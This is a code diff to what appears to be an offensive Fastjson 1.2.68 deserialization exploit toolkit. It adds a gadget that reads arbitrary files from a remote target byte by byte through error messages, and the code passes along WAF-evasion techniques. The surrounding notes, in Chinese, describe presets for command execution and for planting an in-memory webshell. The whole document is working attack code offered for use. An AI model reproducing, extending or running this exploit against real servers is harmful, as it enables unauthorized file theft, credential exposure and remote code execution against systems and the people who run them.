@@ -20,6 +20,7 @@ from fastjson_toolkit.poc.memshell import (
     write_spring_memshell_attack_files,
 )
 from fastjson_toolkit.poc.v1_2_68.catalog import get_gadget, list_gadgets
+from fastjson_toolkit.poc.v1_2_68.io_read import brute_read_file_by_error
 from fastjson_toolkit.poc.v1_2_68.models import (
     Poc1268GenerateOptions,
     Poc1268GenerateResult,
@@ -42,6 +43,7 @@ COMMON_NOTES = [
     "preset=echo / memshell / custom。",
     "预设：file=写证明文件；custom=自备 class；exec=ProcessBuilder（bean-exec.xml）；"
     "echo=命令回显；memshell=内存马。",
+    "io_read_error：send + read_length 时按码表逐字节报错读全文。",
 ]
 
 DEFAULT_ATTACK_BASE = "http://127.0.0.1:18080/attack"
@@ -244,6 +246,12 @@ def generate_poc_1268(
     notes = list(COMMON_NOTES)
     notes.append(entry.description)
     notes.extend(extra_notes)
+    if entry.id == "io_read_error":
+        notes.append(
+            "报错读全文：请求里带 read_length 且 send=true，"
+            "将按 read_charset（mixed/lower/printable）逐字节爆破；"
+            "仅生成单探针时用 guess_byte / bom_bytes。"
+        )
     if opts.wrap_currency:
         notes.append(
             f"已套 java.util.Currency（字段 {opts.currency_field}）以触发 getter。"
@@ -312,6 +320,42 @@ def run_poc_1268(
     if not target:
         result.ok = False
         result.summary = "target 不能为空"
+        return result
+
+    # io_read_error + read_length → 逐字节报错读全文
+    if gen.gadget == "io_read_error" and opts.read_length:
+        read_url = (opts.url or "file:///tmp/fj1268_copy_src").strip()
+        brute = brute_read_file_by_error(
+            url=read_url,
+            target=target,
+            max_length=int(opts.read_length),
+            charset=opts.read_charset_bytes,
+            charset_name=opts.read_charset,
+            timeout=opts.timeout,
+            headers=opts.headers or {},
+            proxy=opts.proxy,
+            insecure=opts.insecure,
+            content_type=opts.content_type,
+            wrap_currency=opts.wrap_currency,
+            currency_field=opts.currency_field,
+            waf_techniques=opts.waf_techniques,
+            waf_options=opts.waf_options,
+        )
+        result.sent = True
+        result.ok = brute.ok
+        result.payload = brute.last_payload or gen.payload
+        result.status_code = brute.last_status
+        result.response_preview = brute.last_preview
+        result.read_bytes = brute.bytes
+        result.read_content = brute.content
+        result.notes = list(gen.notes) + list(brute.notes)
+        result.summary = brute.summary
+        result.raw = {
+            "status_code": brute.last_status,
+            "probes": brute.probes,
+            "read_bytes": brute.bytes,
+            "read_content": brute.content,
+        }
         return result
 
     headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
